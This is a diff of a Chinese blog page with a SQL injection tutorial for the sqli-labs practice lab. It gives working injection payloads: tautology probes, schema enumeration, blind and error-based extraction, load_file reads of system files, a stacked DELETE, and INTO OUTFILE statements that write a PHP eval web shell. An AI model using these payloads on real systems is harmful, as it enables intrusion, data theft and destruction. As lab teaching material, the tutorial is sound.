@@ -90,7 +90,7 @@ or 1=1--+
                 
                 <span>
                     <b class="iconfont icon-text2"></b> <i>Words count</i>
-                    9.7k
+                    10k
                 </span>
                 
                 
@@ -131,7 +131,7 @@ or 1=1--+
     <div class='main'>
         <div class="content markdown animated fadeIn">
             <h2 id="Tip-1-——-基础知识点"><a href="#Tip-1-——-基础知识点" class="headerlink" title="Tip 1 —— 基础知识点"></a>Tip 1 —— 基础知识点</h2><p>（1）简单的用于尝试的语句</p>
-<pre><code>or 1=1--+
+<pre><code class="Code">or 1=1--+
 &#39;or 1=1--+
 &quot;or 1=1--+
 )or 1=1--+
@@ -140,8 +140,9 @@ or 1=1--+
 &quot;))or 1=1--+
 
 ps:--+和#可以互相替换
-</code></pre><p>（2）mysql命令行的简单命令</p>
-<pre><code>查看所有的数据库
+</code></pre>
+<p>（2）mysql命令行的简单命令</p>
+<pre><code class="Code">查看所有的数据库
 show databases;
 
 使用某个数据库(比如security数据库)
@@ -152,8 +153,9 @@ show tables;
 
 看一下我们想要查看的表的内容(比如users表)
 desc users;
-</code></pre><p>（3）利用 <strong>information_schema</strong> 数据库进行注入的命令</p>
-<pre><code>猜数据库
+</code></pre>
+<p>（3）利用 <strong>information_schema</strong> 数据库进行注入的命令</p>
+<pre><code class="Code">猜数据库
 select schema_name from information_schema.schemata
 
 猜某库的所有表(比如security数据库)
@@ -161,29 +163,34 @@ select table_name from information_schema.tables where table_schema=&#39;securit
 
 猜某表的所有列(比如user表)
 select column_name from information_schema.columns where table_name=&#39;user&#39;
-</code></pre><p>（4） <strong>order by</strong> 命令</p>
-<pre><code>用于显示某个表时，对表中某列进行排序，可以用来猜表有多少列
+</code></pre>
+<p>（4） <strong>order by</strong> 命令</p>
+<pre><code class="Code">用于显示某个表时，对表中某列进行排序，可以用来猜表有多少列
 比如：security-uers表中有3列，可以order by 1 ;order by 2;order by 3;分别是对第1，2，3列排序
 比如：security-email表中有2列，可以order by 1 ;order by 2;分别是对第1，2列排序
 
 ps：如果某一个表只有X列，当order by x+1时，就会开始出错，这一点可以用来猜表有多少列
 具体例子可以看less-1中的讲解
-</code></pre><p>（5） <strong>union</strong> 命令</p>
-<pre><code>union的作用是将两个sql语句进行联合
+</code></pre>
+<p>（5） <strong>union</strong> 命令</p>
+<pre><code class="Code">union的作用是将两个sql语句进行联合
 union前后的两个sql语句的选择列数要相同才可以
 具体理解看less-1里的例子
-</code></pre><p>（6）几个常用函数</p>
-<pre><code>MySQL版本：version()
+</code></pre>
+<p>（6）几个常用函数</p>
+<pre><code class="Code">MySQL版本：version()
 数据库用户名：user()
 数据库名：database()
 数据库路径：@@datadir
 操作系统版本：@@version_compile_os
-</code></pre><p>（7）Limit的用法</p>
-<pre><code>limit 0，1                //表示从第1行开始，显示1行
+</code></pre>
+<p>（7）Limit的用法</p>
+<pre><code class="Code">limit 0，1                //表示从第1行开始，显示1行
 limit 1，3                //表示从第2行开始，显示3行
 
 可以参考以下图片看详细用法：
-</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/0.png" alt></p>
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/0.png" alt></p>
 <h2 id="Tip-2-——-盲注知识点"><a href="#Tip-2-——-盲注知识点" class="headerlink" title="Tip 2 —— 盲注知识点"></a>Tip 2 —— 盲注知识点</h2><p>什么是盲注？盲注就是在sql注入过程中，sql语句执行的选择后，选择的数据不能回显到前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。盲注的类型分为以下三种：</p>
 <ul>
 <li>基于布尔SQL盲注</li>
@@ -193,7 +200,7 @@ limit 1，3                //表示从第2行开始，显示3行
 <p>关于这方面知识的文章很多，我们这里就只做简单介绍</p>
 <p>（1）基于布尔SQL盲注</p>
 <p>常用的函数：<strong>left()，substr()，mid()，ascii()，ord()</strong></p>
-<pre><code>left(string,length)          //left()函数用于截取字符串string的前length个字符
+<pre><code class="Code">left(string,length)          //left()函数用于截取字符串string的前length个字符
 
 substr(string,start,length)    //substr()函数用于截取字符串string，从start位置开始，截取length长度
 
@@ -202,8 +209,9 @@ mid(string,start,length)    //mid()函数功能和substr()函数一样
 ascii(string)            //ascii()函数用于将字符串string转换成ASCII码
 
 ord()                //ord()函数功能和ascii()函数一样
-</code></pre><p>举几个<strong>栗子</strong>：</p>
-<pre><code>left(database(),3)
+</code></pre>
+<p>举几个<strong>栗子</strong>：</p>
+<pre><code class="Code">left(database(),3)
 //database()用于显示数据库名称，3表示截取前3位，如database名称为&quot;security&quot;，那么结果就是&quot;sec&quot;
 
 left(database(),1) &gt; &#39;w&#39;
@@ -212,20 +220,24 @@ left(database(),1) &gt; &#39;w&#39;
 
 substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),3,1)
 //首先string部分的结果是&quot;email&quot;，那么这整个语句的结果是&quot;a&quot;。关于limit的用法，可以在Tip 1上面看到
-</code></pre><p>另外，关于正则表达式可以参考这篇文章：<a href="http://www.cnblogs.com/lcamry/articles/5717442.html" target="_blank" rel="noopener">盲注之正则表达式</a></p>
+</code></pre>
+<p>另外，关于正则表达式可以参考这篇文章：<a href="http://www.cnblogs.com/lcamry/articles/5717442.html" target="_blank" rel="noopener">盲注之正则表达式</a></p>
 <p>（2）基于报错的SQL盲注</p>
 <p>什么是报错盲注：构造payload让信息通过错误提示回显出来</p>
 <p>这里我们简单了解一下 <strong>extractvalue()和concat()</strong> 函数的用法就行</p>
-<pre><code>extractvalue(1,concat(0x7e,(select database()),0x7e))
+<pre><code class="Code">extractvalue(1,concat(0x7e,(select database()),0x7e))
 //这个函数执行后会将数据库的名称通过报错方式显示出来
-</code></pre><p>（3）基于时间的SQL盲注</p>
+</code></pre>
+<p>（3）基于时间的SQL盲注</p>
 <p>什么是时间盲注：原理于布尔盲注差不多，只不过添加控制时间的函数：当结果正确（错误）时，让页面停留n秒后再返回结果</p>
 <p>常用函数：<strong>if()，sleep()</strong></p>
-<pre><code>if(expr1,expr2,expr3)    //如果expr1的值为true，则返回expr2的值，如果expr1的值为false，则返回expr3的值。
+<pre><code class="Code">if(expr1,expr2,expr3)    //如果expr1的值为true，则返回expr2的值，如果expr1的值为false，则返回expr3的值。
 sleep(n)        //睡眠n秒
-</code></pre><p>举个<strong>栗子</strong>：</p>
-<pre><code>if(substr(database(),1,1))=&#39;s&#39;,0,sleep(5))    //如果数据库的名称的第一个字符是&#39;s&#39;，就直接返回结果，不然就延时5秒再返回结果
-</code></pre><h2 id="Tip-3-——-导入导出文件知识点"><a href="#Tip-3-——-导入导出文件知识点" class="headerlink" title="Tip 3 —— 导入导出文件知识点"></a>Tip 3 —— 导入导出文件知识点</h2><p>1、load_file()导出文件</p>
+</code></pre>
+<p>举个<strong>栗子</strong>：</p>
+<pre><code class="Code">if(substr(database(),1,1))=&#39;s&#39;,0,sleep(5))    //如果数据库的名称的第一个字符是&#39;s&#39;，就直接返回结果，不然就延时5秒再返回结果
+</code></pre>
+<h2 id="Tip-3-——-导入导出文件知识点"><a href="#Tip-3-——-导入导出文件知识点" class="headerlink" title="Tip 3 —— 导入导出文件知识点"></a>Tip 3 —— 导入导出文件知识点</h2><p>1、load_file()导出文件</p>
 <p>Load_file(file_name):读取文件并返回该文件的内容作为一个字符串。</p>
 <p>使用条件：</p>
 <ol>
@@ -252,9 +264,10 @@ sleep(n)        //睡眠n秒
 <p>在很多PHP程序中，当提交一个错误的Query，如果display_errors = on，程序就会暴露WEB目录的绝对路径，只要知道路径，那么对于一个可以注入的PHP程序来说，整个服务器的安全将受到严重的威胁。</p>
 <p>常用路径：<br><a href="http://www.cnblogs.com/lcamry/p/5729087.html" target="_blank" rel="noopener">http://www.cnblogs.com/lcamry/p/5729087.html</a></p>
 <p>示例：</p>
-<pre><code>Select 1,2,3,4,5,6,7,hex(replace(load_file(char(99,58,92,119,105,110,100,111,119,115,92,114,101,112,97,105,114,92,115,97,109)))
-</code></pre><p>利用hex()将文件内容导出来，尤其是smb文件时可以使用。</p>
-<pre><code>-1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105)) 
+<pre><code class="Code">select 1,2,3,4,5,6,7,hex(replace(load_file(char(99,58,92,119,105,110,100,111,119,115,92,114,101,112,97,105,114,92,115,97,109)))
+</code></pre>
+<p>利用hex()将文件内容导出来，尤其是smb文件时可以使用。</p>
+<pre><code class="Code">-1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105)) 
 Explain：“char(99,58,47,98,111,111,116,46,105,110,105)”就是“c:/boot.ini”的ASCII代码
 
 -1 union select 1,1,1,load_file(0x633a2f626f6f742e696e69) 
@@ -262,30 +275,37 @@ Explain：“c:/boot.ini”的16进制是“0x633a2f626f6f742e696e69”
 
 -1 union select 1,1,1,load_file(c:\\boot.ini) 
 Explain:路径里的/用 \\代替
-</code></pre><p>2、文件导入到数据库</p>
+</code></pre>
+<p>2、文件导入到数据库</p>
 <p>LOAD DATA INFILE语句用于高速地从一个文本文件中读取行，并装入一个表中。文件名称必须为一个文字字符串。</p>
 <p>在注入过程中，我们往往需要一些特殊的文件，比如配置文件，密码文件等。当你具有数据库的权限时，可以将系统文件利用load data infile导入到数据库中。</p>
 <p>函数具体介绍：对于参数介绍这里就不过多的赘述了，可以参考mysql的文档。（提醒：参考文档才是最佳的学习资料）</p>
 <p>示例：</p>
-<pre><code>load data infile &#39;/tmp/t0.txt&#39; ignore into table t0 character set gbk fields terminated by &#39;\t&#39; lines terminated by &#39;\n&#39;
-</code></pre><p>3、导入到文件</p>
-<pre><code>SELECT.....INTO OUTFILE &#39;file_name&#39;
-</code></pre><p>可以把被选择的行写入一个文件中。该文件被创建到服务器主机上，因此您必须拥有FILE权限，才能使用此语法。file_name不能是一个已经存在的文件。</p>
+<pre><code class="Code">load data infile &#39;/tmp/t0.txt&#39; ignore into table t0 character set gbk fields terminated by &#39;\t&#39; lines terminated by &#39;\n&#39;
+</code></pre>
+<p>3、导入到文件</p>
+<pre><code class="Code">SELECT.....INTO OUTFILE &#39;file_name&#39;
+</code></pre>
+<p>可以把被选择的行写入一个文件中。该文件被创建到服务器主机上，因此您必须拥有FILE权限，才能使用此语法。file_name不能是一个已经存在的文件。</p>
 <p>我们一般有两种利用形式：</p>
 <p>第一种直接将select内容导入到文件中：</p>
-<pre><code>Select version() into outfile “c:\\phpnow\\htdocs\\test.php”
-</code></pre><p>此处将version()替换成一句话，&lt;?php @eval($_post[“mima”])?&gt;也即</p>
-<pre><code>Select  &lt;?php @eval($_post[“mima”])?&gt;  into outfile “c:\\phpnow\\htdocs\\test.php”
-</code></pre><p>直接连接一句话就可以了，其实在select内容中不仅仅是可以上传一句话的，也可以上传很多的内容。</p>
+<pre><code class="Code">select version() into outfile “c:\\phpnow\\htdocs\\test.php”
+</code></pre>
+<p>此处将version()替换成一句话，\&lt;?php @eval($_post[“mima”])?>也即</p>
+<pre><code class="Code">select &lt;?php @eval($_post[“mima”])?&gt; into outfile “c:\\phpnow\\htdocs\\test.php”
+</code></pre>
+<p>直接连接一句话就可以了，其实在select内容中不仅仅是可以上传一句话的，也可以上传很多的内容。</p>
 <p>第二种修改文件结尾：</p>
-<pre><code>Select version() Into outfile “c:\\phpnow\\htdocs\\test.php” LINES TERMINATED BY 0x16进制文件
-</code></pre><p>解释：通常是用\r\n结尾，此处我们修改为自己想要的任何文件。同时可以用FIELDS TERMINATED BY</p>
+<pre><code class="Code">select version() Into outfile “c:\\phpnow\\htdocs\\test.php” LINES TERMINATED BY 0x16进制文件
+</code></pre>
+<p>解释：通常是用\r\n结尾，此处我们修改为自己想要的任何文件。同时可以用FIELDS TERMINATED BY</p>
 <p>16进制可以为一句话或者其他任何的代码，可自行构造。在sqlmap中os-shell采取的就是这样的方式，具体可参考os-shell分析文章：<a href="http://www.cnblogs.com/lcamry/p/5505110.html" target="_blank" rel="noopener">http://www.cnblogs.com/lcamry/p/5505110.html</a></p>
 <p>注意：</p>
 <p>（1）可能在文件路径当中要注意转义，这个要看具体的环境</p>
-<p>（2）上述我们提到了load_file(),但是当前台无法导出数据的时候，我们可以利用下面的语句：</p>
-<pre><code>select load_file(‘c:\\wamp\\bin\\mysql\\mysql5.6.17\\my.ini’)into outfile ‘c:\\wamp\\www\\test.php’
-</code></pre><p>可以利用该语句将服务器当中的内容导入到web服务器下的目录，这样就可以得到数据了。上述my.ini当中存在password项（不过默认被注释），当然会有很多的内容可以被导出来，这个要平时积累。</p>
+<p>（2）上述我们提到了load_file()，但是当前台无法导出数据的时候，我们可以利用下面的语句：</p>
+<pre><code class="Code">select load_file(‘c:\\wamp\\bin\\mysql\\mysql5.6.17\\my.ini’) into outfile ‘c:\\wamp\\www\\test.php’
+</code></pre>
+<p>可以利用该语句将服务器当中的内容导入到web服务器下的目录，这样就可以得到数据了。上述my.ini当中存在password项（不过默认被注释），当然会有很多的内容可以被导出来，这个要平时积累。</p>
 <h2 id="Tip-4-——-宽字节注入知识点"><a href="#Tip-4-——-宽字节注入知识点" class="headerlink" title="Tip 4 —— 宽字节注入知识点"></a>Tip 4 —— 宽字节注入知识点</h2><p>宽字节注入重点针对<code>’</code>和<code>\</code>的过滤，所以我们放在一起来进行讨论。</p>
 <p>对宽字节注入的同学应该对这几关的bypass方式应该比较了解。我们在此介绍一下宽字节注入的原理和基本用法。</p>
 <p>原理：mysql在使用GBK编码的时候，会认为两个字符为一个汉字，例如%aa%5c就是一个汉字（前一个ascii码大于128才到汉字的范围）。我们在过滤 ’ 的时候，往往利用的思路是将 ‘ 转换为<code>\’</code>（转换的函数或者思路会在每一关遇到的时候介绍）。<br>因此我们在此想办法将 ‘ 前面添加的 \ 除掉，一般有两种思路：</p>
@@ -294,34 +314,45 @@ Explain:路径里的/用 \\代替
 <h2 id="Tip-5-——-堆叠注入知识点"><a href="#Tip-5-——-堆叠注入知识点" class="headerlink" title="Tip 5 —— 堆叠注入知识点"></a>Tip 5 —— 堆叠注入知识点</h2><p>Stacked injections：堆叠注入。从名词的含义就可以看到应该是一堆sql语句（多条）一起执行。而在真实的运用中也是这样的，我们知道在mysql中，主要是命令行中，每一条语句结尾加 ;  表示语句结束。这样我们就想到了是不是可以多句一起使用</p>
 <p>在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句</p>
 <p><code>mysql_query()</code>函数只能执行<code>一个</code>sql语句，而<code>mysqli_multi_query()</code>函数可以执行<code>多个</code>sql语句</p>
-<pre><code>mysql_query() 和 mysqli_multi_query()
-</code></pre><p>例如以下这个例子。用户输入</p>
-<pre><code>1; DELETE FROM products
-</code></pre><p>服务器端生成的sql语句为：（因未对输入的参数进行过滤）</p>
-<pre><code>Select * from products where productid=1;DELETE FROM products
-</code></pre><p>当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p>
+<pre><code class="Code">mysql_query() 和 mysqli_multi_query()
+</code></pre>
+<p>例如以下这个例子。用户输入</p>
+<pre><code class="Code">1; DELETE FROM products
+</code></pre>
+<p>服务器端生成的sql语句为：（因未对输入的参数进行过滤）</p>
+<pre><code class="Code">select * from products where productid=1;DELETE FROM products
+</code></pre>
+<p>当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p>
 <h2 id="Tip-6-——-order-by注入知识点"><a href="#Tip-6-——-order-by注入知识点" class="headerlink" title="Tip 6 —— order by注入知识点"></a>Tip 6 —— order by注入知识点</h2><p>这里将结合Less46的截图来讲解原理</p>
 <p>order by注入传入的参数是<code>sort</code>，一般有以下几种方式进行注入</p>
 <p>①直接添加注入语句</p>
-<pre><code>?sort=(select **)
-</code></pre><p>②rand()：利用两种结果来进行盲注</p>
-<pre><code>?sort=rand(sql语句)
+<pre><code class="Code">?sort=(select **)
+</code></pre>
+<p>②rand()：利用两种结果来进行盲注</p>
+<pre><code class="Code">?sort=rand(sql语句)
 
 Ps：rand(ture)和rand(false)的结果是不一样的
-</code></pre><p>③and：后面添加sql语句</p>
-<pre><code>?sort=1 and (sql语句)
-</code></pre><p>④报错注入</p>
-<p>双查询报错注入</p>
-<pre><code>select count(*) from information_schema.columns group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))
-</code></pre><p>procedure analyse()：前面不用跟and</p>
-<pre><code>?sort=1 procedure analyse(extractvalue(1,concat(0x3a,database())),1)
-</code></pre><p>extractvalue()：前面要跟and</p>
-<pre><code>?sort=1 and extractvalue(1,concat(0x3a,database(),0x3a))
-</code></pre><p>updatexml()：比extractvalue()多了一个<code>,1</code></p>
-<pre><code>?sort=1 updatexml(1,concat(0x3a,database(),0x3a),1)
-</code></pre><p>⑤into outfile：写马</p>
-<pre><code>?sort=1 into outfile &quot;C:/phpStudy/WWW/shell.php&quot; lines terminated by 0x3c3f70687020406576616c28245f504f53545b5f5d293b203f3e
 </code></pre>
+<p>③and：后面添加sql语句</p>
+<pre><code class="Code">?sort=1 and (sql语句)
+</code></pre>
+<p>④报错注入</p>
+<p>双查询报错注入</p>
+<pre><code class="Code">select count(*) from information_schema.columns group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))
+</code></pre>
+<p>procedure analyse()：前面不用跟and</p>
+<pre><code class="Code">?sort=1 procedure analyse(extractvalue(1,concat(0x3a,database())),1)
+</code></pre>
+<p>extractvalue()：前面要跟and</p>
+<pre><code class="Code">?sort=1 and extractvalue(1,concat(0x3a,database(),0x3a))
+</code></pre>
+<p>updatexml()：比extractvalue()多了一个<code>,1</code></p>
+<pre><code class="Code">?sort=1 updatexml(1,concat(0x3a,database(),0x3a),1)
+</code></pre>
+<p>⑤into outfile：写马</p>
+<pre><code class="Code">?sort=1 into outfile &quot;C:/phpStudy/WWW/shell.php&quot; lines terminated by 0x3c3f70687020406576616c28245f504f53545b5f5d293b203f3e
+</code></pre>
+
             <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
             <audio id="audio" loop="1" preload="auto" controls="controls"
                 data-autoplay="false">
